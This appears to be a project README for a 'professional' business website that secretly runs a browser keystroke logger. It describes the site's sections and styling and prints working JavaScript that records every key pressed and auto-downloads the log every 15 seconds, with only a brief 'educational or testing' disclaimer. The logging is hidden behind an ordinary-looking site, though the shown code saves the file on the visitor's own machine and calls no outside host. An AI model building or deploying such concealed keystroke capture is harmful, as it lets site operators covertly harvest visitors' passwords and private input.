
# User Guide for Keystroke Logger - Professional Website

## Overview
The "Keystroke Logger - Professional Website" is a basic web-based keystroke logger designed for educational or testing purposes. It monitors keyboard inputs in the background and periodically saves the logs as a text file.

### Features:
- Captures user keystrokes dynamically.
- Downloads the captured keystrokes every 15 seconds.
- Includes a user-friendly design and responsive layout.

---

## File Structure
### HTML
Contains the main structure of the website:
- **Header and Navigation**: Title and basic introduction.
- **Sections**: "About Us", "Our Services", "Team", and "Contact Us".
- **Keystroke Logger**: A hidden textarea element and embedded script for logging keystrokes.

### CSS
Defines the visual appearance and animations, including:
- Background gradients and shadows.
- Button hover effects.
- Card layout for services.
- Smooth fade-in animations.

### JavaScript
Implements the keystroke logger functionality:
- Captures and stores all keyboard inputs dynamically.
- Automatically downloads the logs every 15 seconds.

---

## How to Use
1. **Load the Website**: Open the HTML file in a web browser.
2. **Interact with the Website**:
   - Navigate through the sections ("About Us", "Services", etc.).
   - Perform any keyboard input during the session.
3. **Keystroke Logging**:
   - The logger will capture all keystrokes in the background.
   - A `.txt` file containing the captured keystrokes will automatically download every 15 seconds.

---

## Code Explanation

### Key JavaScript Code
```javascript
let keystrokes = "";

// Capture keypresses in the background
document.addEventListener("keydown", (event) => {
  keystrokes += event.key; // Append the pressed key to the log
});

// Function to download the keystrokes log as a file
function downloadLog() {
  if (keystrokes) {
    const blob = new Blob([keystrokes], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "keystrokes_log.txt";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    keystrokes = ""; // Clear log
  }
}

// Timer to auto-download every 15 seconds
setInterval(() => {
  downloadLog();
}, 15000); // 15 seconds
```

---

## Important Notes
- **Purpose**: This project is for educational or testing purposes only. Using it for unauthorized data collection or malicious activities violates ethical standards and may be illegal.
- **Security Warning**: Ensure you have permission to use this tool in the environment where it is deployed.

---

## Credits
Website design and functionality created by [Your Name/Company Name].
